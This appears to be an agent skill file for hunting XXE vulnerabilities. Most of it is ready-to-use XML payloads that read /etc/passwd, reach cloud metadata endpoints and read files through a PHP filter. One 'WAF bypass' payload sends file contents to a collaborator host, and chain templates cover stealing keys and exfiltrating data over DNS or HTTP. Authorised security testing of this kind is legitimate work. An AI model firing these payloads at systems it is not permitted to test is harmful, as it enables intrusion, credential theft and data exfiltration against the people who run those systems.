---
name: hunt-xxe
description: "Hunting skill for XML External Entity (XXE) injection vulnerabilities. In-band XXE (file read), blind XXE (OOB), XXE to SSRF, XXE to RCE via expect/protocol handler. Use when testing endpoints that accept XML (SOAP, REST XML, SVG upload, DOCX/XLSX upload)."
---

# Hunt: XXE (XML External Entity)

## Detection Patterns

### In-Band XXE
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```
If `/etc/passwd` appears in response → in-band XXE.

### Blind XXE (OOB)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://<collab>.oastify.com/test">]>
<root>&xxe;</root>
```
Send to endpoint. If collaborator receives request → blind XXE.

### XXE to SSRF
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>
```
Extract cloud metadata via XXE.

### XXE via SVG Upload
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">
  <image xlink:href="file:///etc/passwd"/>
</svg>
```

### XXE via Office Document (DOCX/XLSX)
DOCX is a ZIP with XML inside. Inject XXE into `[Content_Types].xml` or `word/document.xml`.

## PHP Wrapper XXE
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
```
If PHP's libxml supports PHP wrappers → read files via base64 filter.

## WAF Bypass
```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  <!ENTITY % eval "<!ENTITY exfiltrate SYSTEM 'http://<collab>/?file=%file;'>">
  %eval;
]>
<root>&exfiltrate;</root>
```
Parameter entities bypass some WAF rules.

## Confirmation Gates
- `/etc/passwd` in response → confirmed + high
- OOB collaborator callback → confirmed (blind XXE)
- Cloud metadata in response → confirmed + critical
- SVG XXE triggers → confirmed + medium

## Chain Templates
- XXE + SSRF → cloud metadata extraction
- XXE + File Read → source code → find keys/passwords
- XXE (blind) + OOB → data exfiltration via DNS/HTTP channel
